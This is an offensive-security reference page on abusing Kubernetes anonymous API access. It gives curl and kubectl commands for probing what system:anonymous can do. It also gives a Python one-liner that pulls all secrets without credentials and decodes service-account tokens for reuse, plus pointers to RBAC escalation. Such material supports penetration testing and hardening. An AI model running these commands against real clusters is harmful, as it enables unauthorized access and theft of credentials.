---
title: "Anonymous API access: unauthenticated requests the API server honours"
description: "When the API server runs with anonymous authentication enabled and a binding grants the system:anonymous user or system:unauthenticated group any rights, unauthenticated callers can act. Historically some clusters bound these to powerful roles; even read access to secrets or discovery through an anonymous identity is a foothold with no credential at all."
keywords:
  - anonymous-auth
  - system:anonymous
  - system:unauthenticated
  - api server
  - unauthenticated
---

# Anonymous API access

The API server accepts unauthenticated requests as the user `system:anonymous` in the group `system:unauthenticated` when `--anonymous-auth` is enabled, which it is by default. Normally those identities have no rights, so anonymous requests are denied at authorization. The exposure appears when a RoleBinding or ClusterRoleBinding grants `system:anonymous` or `system:unauthenticated` any permission, whether through a careless convenience binding or a component that bound them broadly. Then an attacker acts with no credential.

Test what anonymous can do:

```bash
# unauthenticated calls: no token, no client cert
curl -sk https://<api>:6443/version
curl -sk https://<api>:6443/api/v1/namespaces/default/pods
# check anonymous permissions explicitly
kubectl --insecure-skip-tls-verify --server=https://<api>:6443 \
  auth can-i --list --as=system:anonymous
kubectl ... auth can-i get secrets --as=system:anonymous --all-namespaces
```

## From anonymous to impact

```bash
# if anonymous can read secrets, harvest tokens and act as a real identity
curl -sk https://<api>:6443/api/v1/secrets | \
  python3 -c 'import sys,json,base64;[print(base64.b64decode(d.get("data",{}).get("token","")).decode("utf-8","replace")[:60]) for d in json.load(sys.stdin)["items"]]'
# if anonymous can create pods or bindings, escalate via the RBAC routes
```

## Exploitation notes

- The default `system:anonymous` has no rights; a working anonymous call means a binding exists for it, so the first step is `auth can-i --list --as=system:anonymous` to learn the scope.
- Even anonymous discovery (`/api`, `/apis`, `/version`) confirms reachability and version for matching further attacks; anonymous read of `secrets` or `pods` is a direct foothold.
- Any anonymous write verb routes into the RBAC escalation group, for example [Pod creation to node](../rbac-privilege-escalation/pod-creation-to-node.md) or [Escalate and bind verbs](../rbac-privilege-escalation/escalate-and-bind-verbs.md).

## References

- [Kubernetes: anonymous requests](https://kubernetes.io/docs/reference/access-authn-authz/authentication/#anonymous-requests)
- [kube-hunter: anonymous access](https://aquasecurity.github.io/kube-hunter/)
